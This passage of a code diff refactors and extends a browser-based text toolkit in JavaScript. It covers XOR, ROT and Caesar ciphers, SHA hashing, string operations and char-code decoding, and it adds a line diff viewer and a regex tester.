-  if (outFmt === 'hex') {
-    out = result.map(b => b.toString(16).padStart(2,'0')).join(' ');
-  } else if (outFmt === 'b64') {
-    out = btoa(result.map(b => String.fromCharCode(b)).join(''));
-  } else {
-    out = result.map(b => String.fromCharCode(b)).join('');
-  }
+  if (outFmt === 'hex') out = result.map(b => b.toString(16).padStart(2,'0')).join(' ');
+  else if (outFmt === 'b64') out = btoa(result.map(b => String.fromCharCode(b)).join(''));
+  else out = result.map(b => String.fromCharCode(b)).join('');
   document.getElementById('xor-out').value = out;
   notice('xor-notice','notice-ok',`${dir === 'enc' ? 'Encrypted' : 'Decrypted'} ${inputBytes.length} bytes`);
 }
@@ -1825,10 +1652,7 @@ function rotApply() {
       return String.fromCharCode(((c.charCodeAt(0) - base + n) % 26) + base);
     });
   } else {
-    // All printable ASCII (0x20–0x7E = 95 chars)
-    out = val.replace(/[\x20-\x7e]/g, c => {
-      return String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20);
-    });
+    out = val.replace(/[\x20-\x7e]/g, c => String.fromCharCode(((c.charCodeAt(0) - 0x20 + n) % 95) + 0x20));
   }
   document.getElementById('rot-out').value = out;
 }
@@ -1844,8 +1668,7 @@ function caesarShift(text, shift) {
   });
 }
 function caesarEnc() {
-  const shift = parseInt(document.getElementById('cae-shift').value) || 3;
-  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, shift);
+  document.getElementById('cae-out').value = caesarShift(document.getElementById('cae-in').value, parseInt(document.getElementById('cae-shift').value) || 3);
 }
 function caesarDec() {
   const shift = parseInt(document.getElementById('cae-shift').value) || 3;
@@ -1854,9 +1677,7 @@ function caesarDec() {
 function caesarBrute() {
   const val = document.getElementById('cae-in').value;
   let lines = '';
-  for (let i = 1; i <= 25; i++) {
-    lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(val, i)}\n`;
-  }
+  for (let i = 1; i <= 25; i++) lines += `ROT-${String(i).padStart(2,'0')}: ${caesarShift(val, i)}\n`;
   document.getElementById('cae-out').value = lines.trim();
 }
 
@@ -1866,16 +1687,14 @@ function caesarBrute() {
 async function computeHashes() {
   const val = document.getElementById('hash-in').value;
   if (!val) return;
-  const enc = new TextEncoder();
-  const data = enc.encode(val);
+  const enc = new TextEncoder(), data = enc.encode(val);
   const algos = ['SHA-1','SHA-256','SHA-384','SHA-512'];
   const results = await Promise.all(algos.map(async a => {
     const buf = await crypto.subtle.digest(a, data);
     const hex = Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2,'0')).join('');
     return { name: a, hex };
   }));
-  const container = document.getElementById('hash-results');
-  container.innerHTML = results.map(r => `
+  document.getElementById('hash-results').innerHTML = results.map(r => `
     <div class="hash-row">
       <div class="hash-name">${r.name}</div>
       <div class="hash-val" title="${r.hex}">${r.hex}</div>
@@ -1890,19 +1709,17 @@ function strTool(op) {
   const val = document.getElementById('str-in').value;
   let out = val;
   switch(op) {
-    case 'reverse': out = val.split('').reverse().join(''); break;
-    case 'upper':   out = val.toUpperCase(); break;
-    case 'lower':   out = val.toLowerCase(); break;
-    case 'title':   out = val.replace(/\b\w/g, c => c.toUpperCase()); break;
-    case 'trim':    out = val.split('\n').map(l => l.trim()).join('\n').trim(); break;
-    case 'dedupe':  out = [...new Set(val.split('\n'))].join('\n'); break;
-    case 'sort':    out = val.split('\n').sort((a,b) => a.localeCompare(b)).join('\n'); break;
-    case 'sortz':   out = val.split('\n').sort((a,b) => b.localeCompare(a)).join('\n'); break;
-    case 'linerev': out = val.split('\n').reverse().join('\n'); break;
+    case 'reverse':  out = val.split('').reverse().join(''); break;
+    case 'upper':    out = val.toUpperCase(); break;
+    case 'lower':    out = val.toLowerCase(); break;
+    case 'title':    out = val.replace(/\b\w/g, c => c.toUpperCase()); break;
+    case 'trim':     out = val.split('\n').map(l => l.trim()).join('\n').trim(); break;
+    case 'dedupe':   out = [...new Set(val.split('\n'))].join('\n'); break;
+    case 'sort':     out = val.split('\n').sort((a,b) => a.localeCompare(b)).join('\n'); break;
+    case 'sortz':    out = val.split('\n').sort((a,b) => b.localeCompare(a)).join('\n'); break;
+    case 'linerev':  out = val.split('\n').reverse().join('\n'); break;
     case 'count':
-      const chars = val.length;
-      const words = val.trim() ? val.trim().split(/\s+/).length : 0;
-      const lines = val.split('\n').length;
+      const chars = val.length, words = val.trim() ? val.trim().split(/\s+/).length : 0, lines = val.split('\n').length;
       out = `Characters: ${chars}\nWords: ${words}\nLines: ${lines}\n\n${val}`;
       break;
   }
@@ -1930,11 +1747,95 @@ function charDecode() {
     val = val.replace(/String\.fromCharCode\(|\)/g,'').replace(/\[|\]/g,'').replace(/new byte\[\]\s*\{|\}/g,'');
     const codes = val.split(/[\s,]+/).filter(Boolean).map(v => {
       v = v.trim();
-      if (v.startsWith('0x') || v.startsWith('0X')) return parseInt(v, 16);
-      return parseInt(v);
+      return (v.startsWith('0x') || v.startsWith('0X')) ? parseInt(v,16) : parseInt(v);
     });
     document.getElementById('cc-out').value = codes.map(c => String.fromCharCode(c)).join('');
   } catch(e) { notice('cc-notice','notice-err','Parse failed.'); }
+}
+
+// ═══════════════════════════════════════════════
+// TEXT DIFF
+// ═══════════════════════════════════════════════
+function computeDiff() {
+  const aLines = document.getElementById('diff-a').value.split('\n');
+  const bLines = document.getElementById('diff-b').value.split('\n');
+  const out = document.getElementById('diff-out');
+
+  // Simple LCS-based line diff
+  const m = aLines.length, n = bLines.length;
+  const dp = Array.from({length: m+1}, () => new Array(n+1).fill(0));
+  for (let i = m-1; i >= 0; i--)
+    for (let j = n-1; j >= 0; j--)
+      dp[i][j] = aLines[i] === bLines[j] ? dp[i+1][j+1]+1 : Math.max(dp[i+1][j], dp[i][j+1]);
+
+  const lines = [];
+  let i=0, j=0;
+  while (i < m || j < n) {
+    if (i < m && j < n && aLines[i] === bLines[j]) {
+      lines.push({ type:'same', text: aLines[i] }); i++; j++;
+    } else if (j < n && (i >= m || dp[i+1][j] >= dp[i][j+1])) {
+      lines.push({ type:'add', text: bLines[j] }); j++;
+    } else {
+      lines.push({ type:'del', text: aLines[i] }); i++;
+    }
+  }
+
+  let adds=0, dels=0;
+  out.innerHTML = lines.map(l => {
+    if (l.type==='add') { adds++; return `<div style="color:#4ade80;background:rgba(34,197,94,.07);padding:0 4px;">+ ${escHtml(l.text)}</div>`; }
+    if (l.type==='del') { dels++; return `<div style="color:#f87171;background:rgba(239,68,68,.07);padding:0 4px;">- ${escHtml(l.text)}</div>`; }
+    return `<div style="color:var(--text-3);padding:0 4px;">  ${escHtml(l.text)}</div>`;
+  }).join('') || '<div style="color:var(--text-3);">No differences found.</div>';
+  out.insertAdjacentHTML('afterbegin', `<div style="color:var(--text-2);font-size:11px;margin-bottom:8px;padding-bottom:6px;border-bottom:1px solid var(--border);">+${adds} additions  −${dels} deletions</div>`);
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ═══════════════════════════════════════════════
+// REGEX TESTER
+// ═══════════════════════════════════════════════
+function regexTest() {
+  const pattern = document.getElementById('rx-pattern').value;
+  const flags = document.getElementById('rx-flags').value;
+  const input = document.getElementById('rx-input').value;
+  const results = document.getElementById('rx-results');
+  const count = document.getElementById('rx-count');
+  const countVal = document.getElementById('rx-count-val');
+
+  if (!pattern) {
+    results.innerHTML = '<div style="color:var(--text-3);">Enter a pattern above.</div>';
+    count.style.display = 'none'; return;
+  }
+
+  let rx;
+  try {
+    rx = new RegExp(pattern, flags.replace(/[^gimsuy]/g,''));
+    document.getElementById('rx-notice').classList.remove('show');
+  } catch(e) {
+    notice('rx-notice','notice-err','Invalid regex: ' + e.message);
+    results.innerHTML = '<div style="color:var(--text-3);">Fix the pattern above.</div>';
+    count.style.display = 'none'; return;
+  }
+
+  const matches = [...input.matchAll(new RegExp(pattern, flags.replace(/[^gimsuy]/g,'').includes('g') ? flags : flags+'g'))];
+  if (!matches.length) {
+    results.innerHTML = '<div style="color:var(--text-2);">No matches.</div>';
+    count.style.display = 'none'; return;
+  }
+
+  countVal.textContent = matches.length;
+  count.style.display = '';
+
+  results.innerHTML = matches.map((m, idx) => {
+    const groups = m.slice(1).map((g, i) => `<span style="color:var(--teal)">Group ${i+1}:</span> ${escHtml(g ?? '(undefined)')}`).join(' · ');
+    return `<div style="margin-bottom:6px;padding:4px 6px;background:var(--bg-2);border-radius:4px;">
+      <span style="color:var(--accent-hi)">Match ${idx+1}:</span> <span style="color:var(--text-0)">${escHtml(m[0])}</span>
+      <span style="color:var(--text-3);font-size:10px;"> @ index ${m.index}</span>
+      ${groups ? `<div style="font-size:11px;color:var(--text-2);margin-top:2px;">${groups}</div>` : ''}
+    </div>`;
+  }).join('');
 }
 
 // ═══════════════════════════════════════════════
